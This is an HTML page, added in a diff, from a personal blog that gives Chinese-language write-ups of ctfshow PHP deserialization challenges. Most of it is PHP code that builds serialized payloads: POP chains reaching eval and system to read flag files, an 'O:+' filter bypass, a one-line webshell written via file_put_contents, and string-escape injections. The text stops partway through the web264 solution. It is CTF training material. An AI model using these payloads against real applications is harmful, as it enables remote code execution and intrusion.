@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow 反序列化专题：魔术方法、字符串逃逸与 pop 链构造。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 反序列化题解">
+<meta property="og:url" content="https://xendr1a.github.io/2025/08/20/ctfshow-deser/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ctfshow 反序列化专题：魔术方法、字符串逃逸与 pop 链构造。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-20T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.955Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ctfshow 反序列化题解 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ctfshow 反序列化题解</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-20 10:00" pubdate>
+          2025年8月20日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          24k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow 反序列化题解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&#x27;flag.php&#x27;);<br><br>class ctfShowUser&#123;<br>    public $username=&#x27;xxxxxx&#x27;;<br>    public $password=&#x27;xxxxxx&#x27;;<br>    public $isVip=false;<br><br>    public function checkVip()&#123;<br>        return $this-&gt;isVip;<br>    &#125;<br>    public function login($u,$p)&#123;<br>        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;<br>            $this-&gt;isVip=true;<br>        &#125;<br>        return $this-&gt;isVip;<br>    &#125;<br>    public function vipOneKeyGetFlag()&#123;<br>        if($this-&gt;isVip)&#123;<br>            global $flag;<br>            echo &quot;your flag is &quot;.$flag;<br>        &#125;else&#123;<br>            echo &quot;no vip, no flag&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br><br>$username=$_GET[&#x27;username&#x27;];<br>$password=$_GET[&#x27;password&#x27;];<br><br>if(isset($username) &amp;&amp; isset($password))&#123;<br>    $user = new ctfShowUser();<br>    if($user-&gt;login($username,$password))&#123;<br>        if($user-&gt;checkVip())&#123;<br>            $user-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;else&#123;<br>        echo &quot;no vip,no flag&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>审计代码，就是说传入的值要与定义的值相同，然后就会让$isVip&#x3D;ture，输出flag</p>
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfShowUser&#123;<br>public $isVip=true;<br>&#125;<br><br>$a=new ctfShowUser();<br>echo urlencode(serialize($a));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>多了一步对username和password的判断，要求不想等</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfShowUser&#123;<br>public $username=&#x27;xxxxxx&#x27;;<br>public $password=&#x27;asdff&#x27;;<br>public $isVip=true;<br>&#125;<br><br>$a=new ctfShowUser();<br>echo urlencode(serialize($a));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p>首先找到能执行命令的函数，我们看到了eval()，我们需要调用他，那我们得调用backDoor，而这个</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">public function __construct()&#123;<br>     $this-&gt;class=new info();<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>是我们可控的，我们可以把其改成</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">public function __construct()&#123;<br>      $this-&gt;class=new backDoor();<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后给$code&#x3D;<code>&#39;system(&amp;quot;tac f*&amp;quot;);&#39;</code></p>
+<p>那我们就可以得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfShowUser&#123;<br>    private $username=&#x27;xxxxxx&#x27;;<br>    private $password=&#x27;xxxxxx&#x27;;<br>    private $isVip=true; //记得改为true<br>    private $class = &#x27;info&#x27;;<br><br>    public function __construct()&#123;<br>        $this-&gt;class=new backDoor();<br>    &#125;<br>    public function login($u,$p)&#123;<br>        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;<br>    &#125;<br>    public function __destruct()&#123;<br>        $this-&gt;class-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br>class info&#123;<br>    private $user=&#x27;xxxxxx&#x27;;<br>    public function getInfo()&#123;<br>        return $this-&gt;user;<br>    &#125;<br>&#125;<br><br>class backDoor&#123;<br>    private $code=&#x27;system(&quot;tac f*&quot;);&#x27;;//执行命令<br>    public function getInfo()&#123;<br>        eval($this-&gt;code);<br>    &#125;<br>&#125;<br><br>echo urlencode(serialize(new ctfShowUser()));<br></code></pre></td></tr></table></figure>
+
+<p>get传啥都行</p>
+<h3 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs text">class ctfShowUser&#123;<br>    private $username=&#x27;xxxxxx&#x27;;<br>    private $password=&#x27;xxxxxx&#x27;;<br>    private $isVip=false;<br>    private $class = &#x27;info&#x27;;<br><br>    public function __construct()&#123;<br>        $this-&gt;class=new backDoor();  //将class设置为backDoor类的对象<br>    &#125;<br>    public function login($u,$p)&#123;<br>        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;<br>    &#125;<br>    public function __destruct()&#123;<br>        $this-&gt;class-&gt;getInfo();  //这里调用的就是backDoor类的getInfo()方法了<br>    &#125;<br><br>&#125;<br><br>class info&#123;<br>    private $user=&#x27;xxxxxx&#x27;;<br>    public function getInfo()&#123;<br>        return $this-&gt;user;<br>    &#125;<br>&#125;<br><br>class backDoor&#123;<br>    private $code = &#x27;system(&quot;tac flag.php&quot;);&#x27;; //给code赋值为我们要执行的代码<br>    public function getInfo()&#123;<br>        eval($this-&gt;code);<br>    &#125;<br>&#125;<br><br>$user = new ctfShowUser();<br>echo serialize($user);<br>echo urlencode(serialize($user));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>加了一个过滤O:咱们用str_replace(）匹配改掉就ok</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfShowUser&#123;<br>    public $username=&#x27;xxxxxx&#x27;;<br>    public $password=&#x27;xxxxxx&#x27;;<br>    public $isVip=true;<br>    public $class = &#x27;backDoor&#x27;;<br><br>    public function __construct()&#123;<br>        $this-&gt;class=new backDoor();<br>    &#125;<br><br>&#125;<br><br>class backDoor&#123;<br>    public $code=&quot;system(&#x27;cat flag.php&#x27;);&quot;;<br>    public function getInfo()&#123;<br>        eval($this-&gt;code);<br>    &#125;<br>&#125;<br>$a = new ctfShowUser();<br>$a = serialize($a);<br>$a= str_replace(&#x27;O:&#x27;, &#x27;O:+&#x27;,$a);//绕过preg_match<br>echo urlencode($a);<br></code></pre></td></tr></table></figure>
+
+<p>这里解释一下为什么加个+号，因为0:后面跟着的是数字，+就代表正数，就是没改变其意思</p>
+<h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text"><br></code></pre></td></tr></table></figure>
+
+<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：?ctfshow=ctfshow_i_love_36D  #只要有这个ctfshow_i_love_36D就行<br></code></pre></td></tr></table></figure>
+
+<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>highlight_file(__FILE__);<br><br>class ctfshowvip&#123;<br>    public $username;<br>    public $password;<br>    public $code;<br><br>    public function __construct($u,$p)&#123;<br>        $this-&gt;username=$u;<br>        $this-&gt;password=$p;<br>    &#125;<br>    public function __wakeup()&#123;<br>        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;<br>            die(&#x27;error&#x27;);<br>        &#125;<br>    &#125;<br>    public function __invoke()&#123;<br>        eval($this-&gt;code);<br>    &#125;<br><br>    public function __sleep()&#123;<br>        $this-&gt;username=&#x27;&#x27;;<br>        $this-&gt;password=&#x27;&#x27;;<br>    &#125;<br>    public function __unserialize($data)&#123;<br>        $this-&gt;username=$data[&#x27;username&#x27;];<br>        $this-&gt;password=$data[&#x27;password&#x27;];<br>        $this-&gt;code = $this-&gt;username.$this-&gt;password;<br>    &#125;<br>    public function __destruct()&#123;<br>        if($this-&gt;code==0x36d)&#123;<br>            file_put_contents($this-&gt;username, $this-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br>unserialize($_GET[&#x27;vip&#x27;]);<br></code></pre></td></tr></table></figure>
+
+<p>因为在php7.4以上如果出现反序列化这个方法会自动绕过weekup，所以用到的就是</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">public function __construct($u,$p)&#123;<br>     $this-&gt;username=$u;<br>     $this-&gt;password=$p;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>和一个弱比较，code&#x3D;0x36D&#x3D;877</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">public function __destruct()&#123;<br>    if($this-&gt;code==0x36d)&#123;<br>        file_put_contents($this-&gt;username, $this-&gt;password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>众所周知弱类型比较加字母不影响，那我们可以构造877.php，那我们加一句话木马也是ok的</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfshowvip<br>&#123;<br>    public $username;<br>    public $password;<br>    public $code;<br> <br>    public function __construct($u, $p)<br>    &#123;<br>        $this-&gt;username = $u;<br>        $this-&gt;password = $p;<br>    &#125;<br>&#125;<br>$a = new ctfshowvip(&#x27;877.php&#x27;,&quot;&lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot;);<br>echo serialize($a);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>字符串逃逸，hint在message.php中</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class message &#123;<br>    public $from;<br>    public $msg;<br>    public $to;<br>    public $token = &#x27;user&#x27;;<br><br>    public function __construct($f, $m, $t) &#123;<br>        $this-&gt;from = $f;<br>        $this-&gt;msg = $m;<br>        $this-&gt;to = $t;<br>    &#125;<br>&#125;<br><br>function filter($a) &#123;<br>    return str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $a);<br>&#125;<br><br>$msg = new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);<br>$msg_1=serialize($msg);<br>$msg_2=filter($msg_1);<br>echo base64_encode($msg_2);<br><br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:4:&quot;loveU&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:4:&quot;fuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:310:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>理论上应该可行但是会报错？为啥</p>
+<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><p>和262差不多，可以拿来练习一下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class message&#123;<br>    public $from;<br>    public $msg;<br>    public $to;<br>    public $token=&#x27;admin&#x27;;<br>    public function __construct($f,$m,$t)&#123;<br>        $this-&gt;from = $f;<br>        $this-&gt;msg = $m;<br>        $this-&gt;to = $t;<br>    &#125;<br>&#125;<br><br>function filter($msg)<br>&#123;<br>    return str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $msg);<br>&#125;<br><br>$msg=new message(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;);<br>$msg_1=serialize($msg);<br>$msg_2=filter($msg_1);<br>echo 